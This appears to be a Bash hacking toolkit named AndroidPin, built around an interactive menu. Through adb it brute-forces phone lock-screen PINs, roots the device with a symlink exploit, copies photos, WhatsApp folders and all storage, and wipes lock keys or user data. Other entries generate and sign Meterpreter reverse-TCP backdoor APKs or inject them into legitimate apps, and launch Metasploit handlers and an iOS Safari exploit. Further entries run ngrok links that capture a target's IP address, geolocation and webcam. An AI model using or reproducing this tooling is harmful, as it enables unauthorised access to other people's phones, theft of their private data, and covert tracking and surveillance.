#!/usr/bin/env bash

##############################color
m="\e[0;31m"      # merah           # red
k="\e[0;33m"      # kuning          # yellow
h="\e[0;32m"      # hijau           # green
b="\e[0;34m"      # biru            # blue
lm="\e[1;31m"     # merah terang    # pink
lk="\e[1;33m"     # kuning terang   # bright yellow
lh="\e[1;32m"     # hijau terang    # light green
lb="\e[1;34m"     # langit biru     # blue sky
n="\e[0m"         # netral          # neutral
w="\e[1;37m"      # putih tebal     #thick white


###############################give Permissons,if not root user exit
clear
[[ `id -u` -eq 0 ]] > /dev/null 2>&1 || { echo -e ${m} "You must be root to run the script${n}"; echo ; exit 1; }
path=$(pwd)
name='TCHSKING'
version="v1"
function files() {
  file=$path/$name
  bash $file
}
function banner() {

echo -e "${lb}                                                                       
     ,--.                                    ,---.,-----.,----.  ,---.  
     |  | ,---. ,--.--.,--.--.,--. ,--.     /    ||  .--''.-.  || o   \ 
,--. |  || .-. :|  .--'|  .--' \  '  /     /  '  |'--. `\  .' < `..'  | 
|  '-'  /\   --.|  |   |  |     \   ',----.'--|  |.--'  //'-'  | .'  /  
 `-----'  `----'`--'   `--'   .-'  / '----'   `--'`----' `----'  `--'   
                              `---'                                     
  $version
${n}"
echo -e "${m}   Unloack Interface LockScreen${n}"
echo -e "${m}       Android/IOS Hacking${n}"
echo -e "${lb}      Jerry4539 - AndroidPIN${n}"
}

# function menu() {
#   clear
#   banner
#   home
# }
lanip=$(ip addr | grep 'state UP' -A2 | tail -n1 | awk '{print $2}' | cut -f1 -d'/')
lanip6=$(ip addr | grep 'state UP' -A4 | tail -n1 | awk '{print $2}' | cut -f1 -d'/')
publicip=$(dig +short myip.opendns.com @resolver1.opendns.com)
# host=$(host "$publicip" | awk '{print $5}' | sed 's/.$//')
#####os
source data/os
sleep 1
function os() {
  banner
echo -e "${m}        Detect Your OS ${n}"
}
os
sleep 0.5
echo "Kernel: "$(uname)
sleep 0.5
echo $(lsb_release -i)
sleep 0.5
echo $(lsb_release -c)
sleep 0.5
echo "Your IP Address: "$lanip
sleep 3
# echo "Your IP Address (Ipv6): "$lanip6
# sleep 0.5
# echo "Your IP Address (Public): "$host
# sleep 0.5
clear
function config() {
  banner
echo -e "${m}    Detect Installed Package ${n}"
}
config
source data/config
clear
# banner
  clear
  banner
  echo -e "${lh}
  1.Update
  2.Brute Pin 4 Digit
  3.Brute Pin 6 Digit
  14.Get WebCam {Over Internet}
  99.Exit
  ${n}"
  read -p "Jerry4539//:~# " select
if [[ $select == 1 ]]; then
  # remove old version
  rm -f "${path}/Androidpin" >/dev/null 2>&1
  rm -f "${path}/data/config" >/dev/null 2>&1
  rm -f "${path}/data/os" >/dev/null 2>&1
  # update new release
  wget https://raw.githubusercontent.com/itechsking/Androidpin/main/cilocks -O "${path}/Androidpin" >/dev/null 2>&1
  wget https://raw.githubusercontent.com/itechsking/Androidpin/main/data/config -O "${path}/data/config" >/dev/null 2>&1
  wget https://raw.githubusercontent.com/itechsking/Androidpin/data/os -O "${path}/data/os" >/dev/null 2>&1
  # give permission
  chmod +x "${path}/Androidpin" >/dev/null 2>&1
  chmod +x "${path}/data/config" >/dev/null 2>&1
  chmod +x "${path}/data/os" >/dev/null 2>&1
  echo "Done!"
  echo "Restart Androidpin..."
  sleep 3
  files

elif [[ $select == 2 ]]; then
  adb shell input keyevent 26 #Pressing the lock button
  adb shell input keyevent 82

  echo "Brute Pin 4 Digit"
  for i in {0000..9999}; do
      echo "Try =>" $i

      for (( j=0; j<${#i}; j++ )); do
          adb shell input keyevent $((`echo ${i:$j:1}`+7))
      done

      adb shell input keyevent 66

      if ! (( `expr $i + 1` % 5 )); then
          adb shell input keyevent 66
          echo "Delay Limit 30s"
          sleep 30
          adb shell input keyevent 82
          adb shell input swipe 407 1211 378 85
      fi
  done

elif [[ $select == 3 ]]; then
  adb shell input keyevent 26 #Pressing the lock button
  adb shell input keyevent 82

  echo "Brute Pin 6 Digit"
  for i in {000000..999999}; do
      echo "Try =>" $i

      for (( j=0; j<${#i}; j++ )); do
          adb shell input keyevent $((`echo ${i:$j:1}`+7))
      done

      adb shell input keyevent 66

      if ! (( `expr $i + 1` % 5 )); then
          adb shell input keyevent 66
          echo "Delay Limit 30s"
          secs=$((1 * 30))
          while [ $secs -gt 0 ]; do
             echo -ne "$secs\033[0K\r"
             sleep 1
             : $((secs--))
          done

          sleep 30
          adb shell input keyevent 82
          adb shell input swipe 407 1211 378 85
      fi
  done

elif [[ $select == 4 ]]; then
  adb shell input keyevent 26 #Pressing the lock button
  adb shell input keyevent 82
  echo "Brute LockScreen Using Wordlist"
  read -p "list -> " files
  for i in `cat $files`; do
      echo "Try =>" $i

      for (( j=0; j<${#i}; j++ )); do
          adb shell input keyevent $((`echo ${i:$j:1}`+7))
      done

      adb shell input keyevent 66

      if ! (( `expr $i + 1` % 5 )); then
          adb shell input keyevent 66
          echo "Delay Limit 30s"
          secs=$((1 * 30))
          while [ $secs -gt 0 ]; do
             echo -ne "$secs\033[0K\r"
             sleep 1
             : $((secs--))
          done

          sleep 30
          adb shell input keyevent 82
          adb shell input swipe 407 1211 378 85
      fi
  done

elif [[ $select == 5 ]]; then
  adb shell pm list packages | grep io.kos.antiguard 2>/dev/null > /dev/null

isInstalled=$?


if [ $isInstalled -eq 0 ]; then
	adb uninstall io.kos.antiguard
else
	adb install ./AntiGuard/AntiGuard.apk
	adb shell am start io.kos.antiguard/.unlock
fi

elif [[ $select == 6 ]]; then
  adb restore modules/fakebackup.ab

  command "while ! ln -s /data/local.prop /data/data/com.android.settings/a/file99 2>/dev/null; do :; done; echo 'Overwrote local.prop!';"

if command "cat /data/local.prop"
	then echo "Succesfully rooted!"
	echo "Requires a reboot..."
	adb reboot
	sleep 2
	adb wait-for-device
	command "mount -o rw,remount /system"
	adb push modules/su-static /system/xbin/su
	command "/data/local/tmp/busybox chown 0:0 /system/xbin/su"
	command "/data/local/tmp/busybox chmod 6777 /system/xbin/su"
	adb push modules/Superuser.apk /system/app/
	command "rm /data/local.prop"
	adb reboot
fi

elif [[ $select == 7 ]]; then
  clear
  function mmeta() {
    banner
    echo -e "${m}           Adb Toolkit${n}"
  }
  mmeta
  echo -e "${lh}
1.Shell
2.ScreenShot
3.Copy All Camera Photo
4.Copy All WhatsApp Folder
5.Copy All Data Storage
6.Manual Copy {Costum}
7.Backup Data
8.Restore Data
9.Permissons Reset
10.Reboot
99.Menu
${n}  "
fpath="backup"
read -p "itechsking@:~# " select
  if [[ $select == 1 ]]; then
      echo "Opening Shell..."
      sleep 3
      adb shell
    elif [[ $select == 2 ]]; then
      export time=$(date +"%T")
      path=Files/Screenshot
      file=screenshoot-$time.png
      paths=$path/$file
      adb exec-out screencap -p > $file
      sudo mv $file $paths
      echo "Your File Saved In $paths "
    elif [[ $select == 3 ]]; then
      export time=$(date +"%T")
      path=Files
      dir=DCIM-$time
      paths=$path/$dir
      adb pull /sdcard/DCIM/ $path/$dir
      echo "Your File Saved In $paths "
    elif [[ $select == 4 ]]; then
      export time=$(date +"%T")
      path=Files
      dir=WhatsApp-$time
      paths=$path/$dir
      adb pull /sdcard/WhatsApp/ $paths
      echo "Your File Saved In $paths "
    elif [[ $select == 5 ]]; then
      export time=$(date +"%T")
      path=Files
      dir=sdcard-$time
      paths=$path/$dir
      adb pull /sdcard/ $paths
      echo "Your File Saved In $paths "
    elif [[ $select == 6 ]]; then
      echo "Ex: /sdcard/Document/"
      read -p "Enter Path: " pathz
      read -p "Enter Name Folder: " dir
      path=Files
      paths=$path/$dir
      adb pull $pathz $paths
      echo "Your File Saved In $paths "
    elif [[ $select == 7 ]]; then
      adb backup -apk -shared -all -f $fpath/backup.ab
    elif [[ $select == 8 ]]; then
      adb restore $fpath/backup.ab“
    elif [[ $select == 9 ]]; then
      adb shell pm reset-permissions
    elif [[ $select == 10 ]]; then
      adb reboot &> /dev/null
    elif [[ $select == 99 ]]; then
    files
    fi
elif [[ $select == 8 ]]; then
  echo -e "${lh}
  1.Fastboot
  2.Recovery
  ${n}"
  read -p "itechsking@:~# " select
  if [[ $select == 1 ]]; then
    adb reboot bootloader
    deviceConnected=konek
    	if [ "$(konek)" = 'NO' ]; then
    		echo "Waiting Phone..."
    		$adb wait-for-device
      fi
        fastboot devices
        fastboot erase userdata
        fastboot erase cache
   elif [[ $slect == 2 ]]; then
     deviceConnected=konek
     	if [ "$(konek)" = 'NO' ]; then
     		echo "Waiting Phone..."
     		$adb wait-for-device
       fi
       adb devices
       adb shell recovery --wipe_data
  else
    echo -e  "${m} Your Brain Error!${n}"
  fi

elif [[ $select == 9 ]]; then
  rem=$(adb shell su -c rm /data/system/*.key | adb reboot )
  echo $rem
  echo "success"



elif [[ $select == 10 ]]; then
  clear
  function mmeta() {
    banner
    echo -e "${m}   Metasploit Backdoor Generator${n}"
  }
  mmeta
echo -e "${lh}
1.Install Application
2.Create Payload Backdoor {Msfvenom} Singed
3.Run Metasploit
4.Inject Payload In Original Application
99.Menu
${n}"
read -p "iechsking@:~# " select
if [[ $select == 1 ]]; then
  read -p "Enter Ur Application: " app
  read -p "Run Application {Y/N}: " run
  if [ $run == "Y" ] || [ $run == "y" ]; then
     read -p "Enter Package Application Name: " pkg
     adb install $app
     adb shell am start $pkg/.unlock
  else
    adb install $app
  fi

elif [[ $select == 2 ]]; then
  path="backdoor"
  loli="loli.apk"
  read -p "Enter LHOST: " host
  read -p "Enter LPORT: " port
  read -p "Application Name: " app
  paths=$path/$loli
  echo -e "${lb}Wait Creating Backdoor...${n}"
  msfvenom -p android/meterpreter/reverse_tcp lhost=$host lport=$port R> $paths
  echo "Wait Installing Keystore..."
  sleep 5
  keytool -genkey -V -keystore $path/key.keystore -alias hacked -keyalg RSA -keysize 2048 -validity 10000
  jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore $path/key.keystore $paths hacked
  jarsigner -verify -verbose -certs $paths
  zipalign -v 4 $paths $path'/'$app'.apk'
  milf=$path/$app'.apk'
  rm $paths
  rm $path/key.keystore
  echo "Your Backdoor Created In" $milf
elif [[ $select == 3 ]]; then
  clear
  mmeta
  payload='android/meterpreter/reverse_tcp'
  payload2='osx/armle/execute/reverse_tcp'
  echo -e "${lh}
  Payload {Android}${n} =>${m} $payload ${n}${lh}
  Payload (iOS) ${n}=>${m} $payload2 ${n}${lh}
  Listener
  1.Multi Handler {Default}
  2.Remove Lock
  3.Remove Lock {Root}
  4.Safari Jit {iOS < 7.1.2}
  ${n}"
  read -p "itechsking@:~# " select
  if [[ $select == 1 ]]; then
    read -p "LHOST: " host
    read -p "LPORT: " port
    msfconsole=msfconsole
    exploit='use exploit/multi/handler'
    xterm -T " Androidpin Exploit " -geometry 100x35 -e "$msfconsole -x '$exploit; set PAYLOAD $payload ; set lhost $host ; set lport $port; exploit; exit -y'"

  elif [[ $select == 2 ]]; then
    read -p "LHOST: " host
    read -p "LPORT: " port
    msfconsole=msfconsole
    exploit='use post/android/manage/remove_lock'
    xterm -T " Androidpin Exploit " -geometry 100x35 -e "$msfconsole -x '$exploit; set PAYLOAD $payload ; set lhost $host ; set lport $port; exploit; exit -y'"

  elif [[ $select == 3 ]]; then
    read -p "LHOST: " host
    read -p "LPORT: " port
    msfconsole=msfconsole
    exploit='use post/android/manage/remove_lock_root'
    xterm -T " Androidpin Exploit " -geometry 100x35 -e "$msfconsole -x '$exploit; set PAYLOAD $payload ; set lhost $host ; set lport $port; exploit; exit -y'"

  elif [[ $select == 4 ]]; then
    read -p "LHOST: " host
    read -p "LPORT: " port
    msfconsole=msfconsole
    exploit='use exploit/apple_ios/browser/safari_jit'
    xterm -T " Androidpin Exploit " -geometry 100x35 -e "$msfconsole -x '$exploit; set PAYLOAD $payload2 ; set lhost $host ; set lport $port; exploit; exit -y'"
  fi

elif [[ $select == 4 ]]; then
  path="backdoor"
  loli="loli.apk"
  read -p "Enter LHOST: " host
  read -p "Enter LPORT: " port
  read -p "Enter Original Application: " ori
  read -p "Application Name: " app
  paths=$path/$loli
  echo -e "${lb}Wait Creating Backdoor...${n}"
  msfvenom --platform android -x $ori -p android/meterpreter/reverse_tcp lhost=$host lport=$port -o $paths

# if error,uncomment it

# echo "Wait Installing Keystore..."
  # sleep 5
  # keytool -genkey -V -keystore $path/key.keystore -alias hacked -keyalg RSA -keysize 2048 -validity 10000
  # jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore $path/key.keystore $paths hacked
  # jarsigner -verify -verbose -certs $paths
  # zipalign -v 4 $paths $path'/'$app'.apk'
  milf=$path/$app'.apk'
  rm $paths
  # rm $path/key.keystore
  echo "Your Backdoor Created In" $milf
  elif [[ $select == 99 ]]; then
  files
  fi


elif [[ $select == 11 ]]; then
  scrcpy
elif [[ $select == 12 ]]; then
  # function info() {
  #   banner
  #   echo -e "${m}           Phone Info${n}"
  # }
  # clear
  # info
  # echo -e "${lh}
  # 1.Phone Info
  # 2.
  # 99.Menu
  # ${n}"
  # read -p "Jerry4539//:~# " select
  # if [[ $select == 1 ]]; then
  manu=$(adb shell getprop ro.product.manufacturer)
  model=$(adb shell getprop ro.product.model)
  version=$(adb shell getprop ro.build.version.release )
  sdk=$(adb shell getprop ro.build.version.sdk )
  info=$(printf "%s %s %s (API %s)" "$manu" "$model" "$version" "$sdk")
  echo "Info: " $info
  echo "Manufacturer: " $manu
  echo "Model: " $model
  echo "Version: " $version
  echo "Sdk: " $sdk
  # elif [[ $select == 99 ]]; then
  #   files
  # fi

elif [[ $select == 13 ]]; then

# path= "info"

  clear
  function logger() {
    banner
    echo -e "${m}   IP Logger {Over Internet}${n}"
  }
  logger

  menu() {
  trap 'echo -e "\n";stop;exit 1' 2


  dependencies() {

  command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }



  command -v curl > /dev/null 2>&1 || { echo >&2 "I require curl but it's not installed. Install it. Aborting."; exit 1; }

  }


  stop() {

  checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
  checkphp=$(ps aux | grep -o "php" | head -n1)
  checkssh=$(ps aux | grep -o "ssh" | head -n1)
  if [[ $checkngrok == *'ngrok'* ]]; then
  pkill -f -2 ngrok > /dev/null 2>&1
  killall -2 ngrok > /dev/null 2>&1
  fi
  if [[ $checkphp == *'php'* ]]; then
  pkill -f -2 php > /dev/null 2>&1
  killall -2 php > /dev/null 2>&1
  fi
  if [[ $checkssh == *'ssh'* ]]; then
  pkill -f -2 ssh > /dev/null 2>&1
  killall ssh > /dev/null 2>&1
  fi
  if [[ -e sendlink ]]; then
  rm -rf sendlink
  fi

  }

  catch_cred() {

  longitude=$(grep -o 'Longitude:.*' info/geolocate.txt | cut -d " " -f2 | tr -d ' ')
  IFS=$'\n'
  latitude=$(grep -o 'Latitude:.*' info/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
  altitude=$(grep -o 'Altitude:.*' info/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
  accuracy=$(grep -o 'Accuracy:.*' info/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
  hardware=$(grep -o 'Cores:.*' info/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
  speed=$(grep -o 'Speed:.*' info/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
  platform=$(grep -o 'Platform:.*' info/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
  heading=$(grep -o 'Heading:.*' info/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
  memory=$(grep -o 'Memory:.*' info/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
  useragent=$(grep -o 'User-Agent:.*' info/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
  height=$(grep -o 'Screen Height:.*' info/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
  width=$(grep -o 'Screen Width:.*' info/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
  # echo -e "${lh} Geolocation:"
  echo -e "${lh} Latitude:${n}" $latitude
  echo -e "${lh} Longitude:${n}" $longitude
  echo -e "${lh} Altitude:${n}" $altitude
  echo -e "${lh} Speed:${n}" $speed
  echo -e "${lh} Heading:${n}" $heading
  echo -e "${lh} Accuracy:n${n}" $accuracy
  echo -e "${lh} Map:${n} https://www.google.com/maps/place/"$latitude"+"$longitude
  echo -e "${lh} Device Info:${n}"
  echo -e "${lh} Platform:${n}" $platform
  echo -e "${lh} Cores:${n}" $hardware
  echo -e "${lh} User-Agent:${n}" $useragent
  echo -e "${lh} Memory:${n}" $memory
  echo -e "${lh} Resolution:${n}" $height"x"$width
  cat info/geolocate.txt >> info/saved.geolocate.txt
  echo -e "${k} Saved: info/saved.geolocate.txt"
  killall -2 php > /dev/null 2>&1
  killall -2 ngrok > /dev/null 2>&1
  killall ssh > /dev/null 2>&1
  if [[ -e sendlink ]]; then
  rm -rf sendlink
  fi
  exit 1

  }

  getcredentials() {
  echo -e "${lh} Waiting Geolocation ...${n}"
  while [ true ]; do


  if [[ -e "info/geolocate.txt" ]]; then
  echo -e "${m}[*] Geolocation Found!${n}"
  catch_cred

  fi
  sleep 0.5
  if [[ -e "info/error.txt" ]]; then
  echo -e "\n${m}[*] Error on Geolocation!${n}"
  checkerror=$(grep -o 'Error:.*' info/error.txt | cut -d " " -f2 | tr -d ' ' )
  if [[ $checkerror == 1 ]]; then
  echo -e "${m} User Denied Geolocation ...${n}"

  rm -rf info/error.txt
  getcredentials
  elif [[ $checkerror == 2 ]]; then
  echo -e "${m} Geolocation Unavailable ...${n}"

  rm -rf info/error.txt
  getcredentials
  elif [[ $checkerror == 3 ]]; then
  echo -e "${m} Time Out ...${n}"

  rm -rf info/error.txt
  getcredentials
  elif [[ $checkerror == 4 ]]; then
  echo -e "${m} Unknow Error ...${n}"

  rm -rf info/error.txt
  getcredentials
  else
  echo -e "${m} Error reading file error.txt...${n}"
  exit 1
  fi
  fi
  sleep 0.5



  done


  }

  catch_ip() {
  touch info/saved.geolocate.txt
  ip=$(grep -a 'IP:' info/ip.txt | cut -d " " -f2 | tr -d '\r')
  IFS=$'\n'
  ua=$(grep 'User-Agent:' info/ip.txt | cut -d '"' -f2)
  echo -e "${lh} Target IP:${n}" $ip
  echo -e "${lh} User-Agent:${n}" $ua
  echo -e "${k} Saved:info/saved.ip.txt${n}"
  cat info/ip.txt >> info/saved.ip.txt


  if [[ -e iptracker.log ]]; then
  rm -rf iptracker.log
  fi

  IFS='\n'
  iptracker=$(curl -s -L "www.ip-tracker.org/locator/ip-lookup.php?ip=$ip" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > iptracker.log)
  IFS=$'\n'
  continent=$(grep -o 'Continent.*' iptracker.log | head -n1 | cut -d ">" -f3 | cut -d "<" -f1)
  echo -e "\n"
  hostnameip=$(grep  -o "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f7 | cut -d ">" -f2)
  if [[ $hostnameip != "" ]]; then
  echo -e "${lh}[*] Hostname:${n}" $hostnameip
  fi


  reverse_dns=$(grep -a "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f1)
  if [[ $reverse_dns != "" ]]; then
  echo -e "${lh}[*] Reverse DNS:${n}" $reverse_dns
  fi



  if [[ $continent != "" ]]; then
  echo -e "${lh}[*] IP Continent:${n}" $continent
  fi


  country=$(grep -o 'Country:.*' iptracker.log | cut -d ">" -f3 | cut -d "&" -f1)
  if [[ $country != "" ]]; then
  echo -e "${lh}[*] IP Country:${n}" $country
  fi


  state=$(grep -o "tracking lessimpt.*" iptracker.log | cut -d "<" -f1 | cut -d ">" -f2)
  if [[ $state != "" ]]; then
  echo -e "${lh}[*] State:${n}" $state
  fi

  city=$(grep -o "City Location:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)

  if [[ $city != "" ]]; then
  echo -e "${lh}[*] City Location:${n}" $city
  fi


  isp=$(grep -o "ISP:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
  if [[ $isp != "" ]]; then
  echo -e "${lh}[*] ISP:${n}" $isp
  fi


  as_number=$(grep -o "AS Number:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
  if [[ $as_number != "" ]]; then
  echo -e "${lh}[*] AS Number:${n}" $as_number
  fi


  ip_speed=$(grep -o "IP Address Speed:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
  if [[ $ip_speed != "" ]]; then
  echo -e "${lh}[*] IP Address Speed:${n}" $ip_speed
  fi

  ip_currency=$(grep -o "IP Currency:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)

  if [[ $ip_currency != "" ]]; then
  echo -e "${lh}[*] IP Currency:"${n} $ip_currency
  fi

  echo -e "\n"
  rm -rf iptracker.log

  getcredentials
  }

  start() {
  if [[ -e info/ip.txt ]]; then
  rm -rf info/ip.txt

  fi
  if [[ -e info/geolocate.txt ]]; then
  rm -rf info/geolocate.txt

  fi

  if [[ -e info/error.txt ]]; then
  rm -rf info/error.txt

  fi
  if [[ -e ngrok ]]; then
  echo ""
  else

  echo -e "${k}[*] Downloading Ngrok...${n}\n"
  arch=$(uname -a | grep -o 'arm' | head -n1)
  arch2=$(uname -a | grep -o 'Android' | head -n1)
  if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
  command -v wget > /dev/null 2>&1 || { echo >&2 "${m}Androidpin require wget but it's not installed. Install it. Aborting.${n}"; exit 1; }
  wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1

  if [[ -e ngrok-stable-linux-arm.zip ]]; then
  unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
  chmod +x ngrok
  rm -rf ngrok-stable-linux-arm.zip
  else
  echo -e "${m}[!] Download error... Termux?Nethunter?, run: pkg install wget${n}"
  exit 1
  fi



  else
  wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1
  if [[ -e ngrok-stable-linux-386.zip ]]; then
  command -v unzip > /dev/null 2>&1 || { echo >&2 "${m}Androidpin require unzip but it's not installed. Install it. Aborting.${n}"; exit 1; }
  unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
  chmod +x ngrok
  rm -rf ngrok-stable-linux-386.zip
  else
  echo -e "${m}[!] Download error... ${n}"
  exit 1
  fi
  fi
  fi

  echo -e "${lh}[*] Starting php server...${n}"
  php -t "info/" -S 127.0.0.1:3333 > /dev/null 2>&1 &
  sleep 2
  echo -e "${lh}[*] Starting ngrok server...${n}"
  ./ngrok http 3333 > /dev/null 2>&1 &
  sleep 10

  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z-]*\.ngrok.io")
  echo -e "${lb}[*] Send this link to the Target:${n}" $link
  checkfound
  }

  loli(){
    start
  }
  checkfound() {

  echo -e "\n"
  echo -e "${lh} Waiting target open the link, ${n}Press Ctrl + C to exit..."
  while [ true ]; do


  if [[ -e "info/ip.txt" ]]; then
  echo -e "${m} IP Found!${n}"
  catch_ip

  fi
  sleep 1
  done


  }
  dependencies
  loli
  menu

  }
  menu


elif [[ $select == 14 ]]; then

  clear
  function cam() {
    banner
    echo -e "${m}   Get WebCam {Over Internet}${n}"
  }
  cam

  stop() {

  checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
  checkphp=$(ps aux | grep -o "php" | head -n1)
  checkssh=$(ps aux | grep -o "ssh" | head -n1)
  if [[ $checkngrok == *'ngrok'* ]]; then
  pkill -f -2 ngrok > /dev/null 2>&1
  killall -2 ngrok > /dev/null 2>&1
  fi

  if [[ $checkphp == *'php'* ]]; then
  killall -2 php > /dev/null 2>&1
  fi
  if [[ $checkssh == *'ssh'* ]]; then
  killall -2 ssh > /dev/null 2>&1
  fi
  exit 1

  }

  dependencies() {


  command -v php > /dev/null 2>&1 || { echo >&2 "${lh}Androidpin require php but it's not installed. Install it. Aborting.${n}"; exit 1; }



  }

  catch_ip() {

  ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
  IFS=$'\n'
  echo -e "${m}IP:${n}" $ip

  cat ip.txt >> saved.ip.txt


  }

  checkfound() {

  echo -e "\n"
  echo -e "${lh} Waiting targets,${n} Press Ctrl + C to exit..."
  while [ true ]; do


  if [[ -e "ip.txt" ]]; then
  echo -e "${m} Target opened the link!${n}\n"
  echo -e "${k} File saved as cam${n}"
  catch_ip
  rm -rf ip.txt

  fi

  sleep 0.5

  if [[ -e "Log.log" ]]; then
  echo -e "${lh} Cam file received!${n}"
  rm -rf Log.log
  fi
  sleep 0.5

  done

  }

  payload_ngrok() {

  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z-]*\.ngrok.io")
  sed 's+forwarding_link+'$link'+g' tmp.html > index2.html
  sed 's+forwarding_link+'$link'+g' tmp.php > index.php


  }

  ngrok_server() {


  if [[ -e ngrok ]]; then
  echo ""
  else
  command -v unzip > /dev/null 2>&1 || { echo >&2 "${lh}Androidpin require unzip but it's not installed. Install it. Aborting.${lh}"; exit 1; }
  command -v wget > /dev/null 2>&1 || { echo >&2 "${lh}Androidpin require wget but it's not installed. Install it. Aborting.${lh}"; exit 1; }
  echo -e "${m} Downloading Ngrok...${n}\n"
  arch=$(uname -a | grep -o 'arm' | head -n1)
  arch2=$(uname -a | grep -o 'Android' | head -n1)
  if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
  wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1

  if [[ -e ngrok-stable-linux-arm.zip ]]; then
  unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
  chmod +x ngrok
  rm -rf ngrok-stable-linux-arm.zip
  else
  echo -e "${m}[!] Download error... Termux?Nethunter?, run: pkg install wget${n}"
  exit 1
  fi

  else
  wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1
  if [[ -e ngrok-stable-linux-386.zip ]]; then
  unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
  chmod +x ngrok
  rm -rf ngrok-stable-linux-386.zip
  else
  echo -e "${m}[!] Download error...${n} "
  exit 1
  fi
  fi
  fi

  echo -e "${lh} [*] Starting php server...${n}"
  php -S 127.0.0.1:3333 > /dev/null 2>&1 &
  sleep 2
  echo -e "${lh} [*] Starting ngrok server...${n}"
  ./ngrok http 3333 > /dev/null 2>&1 &
  sleep 10

  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z-]*\.ngrok.io")
  echo -e "${lb} [*] Send this link to the Target:${n}" $link

  payload_ngrok
  checkfound
  }

  loli() {
  ngrok_server
  sleep 1
  clear
  loli

  }
  dependencies
  loli



elif [[ $select == 15 ]]; then
  clear
  function fire() {
    banner
    echo -e "${m}   FireStore Vulnerability${n}"
  }
  fire
  echo -e "${lh}
  1.Scanning APK Without Authentication
  ${n}"
  read -p "itechsking@:~# " select
  if [[ $select == 1 ]]; then

    milf() {
        rm -rf "$filename"
        exit
    }
    read -p "File: " loli

    filename=$(basename -- "$loli")
    extension="${filename##*.}"
    filename="fsp-${filename%.*}"

    if [[ "$extension" == "apk" ]]; then
        echo -e "${k}[!] The specified APK is $loli.${n}\n"

        if apktool d "$loli" -o "$filename" >/dev/null 2>&1; then
            echo -e "${lh}[+] Successful decompilation with apktool.${n}\n"
        else
            echo -e "${m}[-] Decompilation failed with apktool.${n}"
            milf
        fi

        if ! grep -qi "firebase" "$filename/AndroidManifest.xml"; then
            echo -e "${m}[-] Firebase not found in the AndroidManifest.xml${n}"
            milf
        else
            echo -e "${lh}[+] Firebase found in the AndroidManifest.xml${n}\n"
            if ! projectID=$(grep -i "project_id" "$filename/res/values/strings.xml"); then
                echo -e "${m}[-] project_id not found in res/values/strings.xml file.${n}"
                milf
            else
                echo -e "${lh}[+] project_id found in res/values/strings.xml file:${n}"
                projectID=$(echo "$projectID" | sed -n 's:.*<string name="project_id">\(.*\)</string>.*:\1:pI')
                echo -e "$projectID\n"
                matchString="lcom/google/firebase/firestore/FirebaseFirestore"
                for c in $(grep -hA 2 "$matchString" -irw "$filename"/smali* 2>/dev/null | grep -iv "$matchString" | grep const-string | sed 's/[^"]*"\([^"]*\)".*/\1/' | sort -u | sed 's/Provided data must not be null.//g'); do
                    collections+=("$c")
                done

                if [ "${#collections[@]}" -eq 0 ]; then
                    echo -e "${m}[-] No collections found in .smali files.${n}"
                    milf
                else
                    echo -e "${lh}[+] ${#collections[@]} Collection(s) found in .smali files.${n}"
                    for c in "${collections[@]}"; do
                         echo "$c"
                    done; echo

                    echo -e "${k}[!] IMPORTANT: Consulting collections can have an economic impact on the objective."
                    echo -e "    Firestore has a daily expense depending on the number of operations performed.${n}\n"
                fi
            fi
        fi
    else
        echo -e "${m}[-] The specified file does not have an .apk extension.${n}"
        milf
    fi

  fi


elif [[ $select == 99 ]]; then
    echo "oke"

else
  echo -e  "${m} Your Brain Error!${n}"
  fi

